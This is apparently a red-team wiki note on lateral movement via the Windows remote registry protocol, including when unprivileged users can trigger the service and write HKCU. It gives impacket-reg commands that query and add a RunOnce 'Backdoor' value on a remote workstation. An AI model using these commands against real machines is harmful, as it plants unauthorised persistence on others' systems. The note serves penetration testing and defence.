---
title: Lateral Movement with Remote Registry
---

[[notes/lateral-movement/index]] by using [MS-RRP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/) to modify the [[notes/windows/registry]], e.g. write to one of the [Run keys](https://persistence-info.github.io/Data/run.html).

The remote registry service runs only on servers by default, but starts on-demand on desktops.
The start of the service can be triggered as unprivileged user ([source](https://twitter.com/splinter_code/status/1715876413474025704)), but if the service was explicitly disabled local admin rights are required to reenable it.

Once the service is running it is possible to read and write the HKCU hive as unprivileged user ([source](https://twitter.com/splinter_code/status/1717706003322478986)).

=== "[[notes/tools/impacket]] with [PR 1638](https://github.com/fortra/impacket/pull/1638)"
    ~~~ bash
    impacket-reg jdoe:'passw0rd'@ws01.corp.local query -keyName 'HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    impacket-reg jdoe:'passw0rd'@ws01.corp.local add -keyName 'HKU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -v Backdoor -vt REG_SZ -vd 'calc.exe'
    ~~~
